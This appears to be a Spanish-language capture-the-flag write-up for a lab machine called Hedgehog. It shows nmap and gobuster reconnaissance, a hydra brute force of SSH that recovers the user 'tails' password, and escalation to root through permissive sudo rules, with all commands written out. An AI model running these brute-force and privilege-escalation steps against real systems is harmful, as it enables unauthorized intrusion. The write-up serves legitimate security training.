# Hedgehog
## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.6p1 Ubuntu`
*   `80/tcp open http Apache httpd 2.4.58 ((Ubuntu))

## 2. Enumeración Web

Al acceder al servicio web en el puerto 80 (`http://<IP_DEL_OBJETIVO>`), nos encontramos con una página que menciona explícitamente la palabra "tails". En el contexto de un CTF, esto suele indicar un posible nombre de usuario.

### 2.1. Fuzzing de Directorios

Para descartar otros vectores de entrada, realizamos una enumeración de directorios utilizando `gobuster`.

```bash
gobuster dir -u http://<IP_DEL_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt
```

Al no encontrar directorios ocultos relevantes, confirmamos que el vector principal es el ataque de fuerza bruta contra el usuario identificado.

## 3. Acceso Inicial (SSH)

Procedemos a atacar el servicio SSH utilizando el usuario `tails` y un diccionario de contraseñas.

### 3.1. Fuerza Bruta con Hydra

```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://<IP_DEL_OBJETIVO> -t 4
```

**Resultado Exitoso:**

- **Login:** `tails`
- **Password:** `3117548331`

### 3.2. Conexión SSH

Establecemos la conexión con las credenciales obtenidas:

```bash
ssh tails@<IP_DEL_OBJETIVO>
# Contraseña: 3117548331
```

## 4. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `tails`, el objetivo es escalar privilegios a `root`.

### 4.1. Escalada Horizontal (Tails -> Sonic)

Enumeramos los permisos de sudo del usuario actual:

```Bash
sudo -l
```

**Salida:**

```
User tails may run the following commands on ...:
    (sonic) NOPASSWD: ALL
```

El usuario `tails` tiene permiso para ejecutar _cualquier comando_ como el usuario `sonic` sin contraseña. Escalamos al usuario `sonic`:

```Bash
sudo -u sonic /bin/bash
```

### 4.2. Escalada Vertical (Sonic -> Root)

Una vez logueados como `sonic`, repetimos la enumeración de privilegios:

```Bash
whoami
# sonic
sudo -l
```

**Salida:**
```
User sonic may run the following commands on ...:
    (ALL) NOPASSWD: ALL
```

El usuario `sonic` tiene permisos completos de `sudo` sobre el sistema. Ejecutamos una shell como superusuario:

```Bash
sudo su
# o sudo /bin/bash
```

Confirmamos el compromiso total del sistema:

```Bash
whoami
# root
```
